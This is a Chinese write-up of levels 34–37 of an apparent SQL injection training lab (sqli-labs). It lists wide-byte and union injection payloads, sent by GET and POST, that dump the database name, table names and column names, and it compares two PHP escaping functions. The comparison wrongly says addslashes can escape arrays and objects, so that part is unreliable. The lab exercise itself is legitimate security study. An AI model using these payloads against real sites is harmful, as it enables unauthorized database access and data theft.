# 34-37
## 第三十四关
该关和前面相同都是宽字节注入，不过该关改成了POST类型
抓包改即可，在输入框中进行输入会对数据进行url编码，如果输入数据本身就是url编码，就会二次编码，导致注入失败
```
uname=1%df%27%20order%20by%203#
uname=1%df%27union%20select%201,database()#

```
## 第三十五关
通过查看源码发现，该关为数字型注入，但是会转义特殊字符，在后续爆表名是会有影响，将表名转成十六进制即可绕过
```
?id=1%20order%20by%204
?id=1111 union select 1,database(),3
?id=1111 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3
?id=1111%20union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273),3
```
## 第三十六关
通过查看源码发现，该关使用`mysqli_real_escape_string`来转义字符，同样是使用GBK编码连接数据库，同样会造成宽字节注入。

mysqli_real_escape_string和addslashes都是用于在将数据插入到数据库之前对字符串进行转义的函数，以防止SQL注入攻击。它们的区别在于以下几点：

1. 函数的使用方式：
   - mysqli_real_escape_string是MySQLi扩展提供的函数，用于在插入或更新数据库之前对字符串进行转义。它需要一个数据库连接对象作为第一个参数，并且只能用于转义字符串。
   - addslashes是PHP的内置函数，用于对字符串中的特殊字符进行转义。它只需要一个字符串作为参数，并且可以用于转义字符串、数组和对象。
2. 转义的范围：
   - mysqli_real_escape_string只会转义SQL语句中的特殊字符，如引号、反斜杠等。它会根据当前连接的字符集来确定需要转义的字符。
   - addslashes会转义一些特殊字符，如引号、反斜杠等，以及ASCII码值在1-31之间的控制字符。它不会根据字符集来确定需要转义的字符。
3. 转义的安全性：
   - mysqli_real_escape_string是针对特定数据库的转义函数，它会根据数据库的规则来转义字符串，以确保转义后的字符串在SQL语句中是安全的。
   - addslashes是一个通用的转义函数，它只是简单地在特殊字符前面添加一个反斜杠。虽然它可以用于防止SQL注入攻击，但在某些情况下可能会存在安全问题。
综上所述，如果你正在使用MySQL数据库，并且有一个可用的数据库连接对象，那么推荐使用mysqli_real_escape_string函数来对字符串进行转义。如果你只是简单地需要转义一些特殊字符，而不涉及数据库操作，那么可以使用addslashes函数

使用宽字节注入即可
```
?id=1%df%27order%20by%204--+
?id=1111%df%27union select 1,database(),3--+
```
## 第三十七关
该关和上一关一样，都使用`mysqli_real_escape_string`来个转义，不过使用POST方式传输数据
抓包，使用union注入即可：
```
uname=1%df%27order%20by%203#
uname=1111%df%27union%20select%201,database()#
```
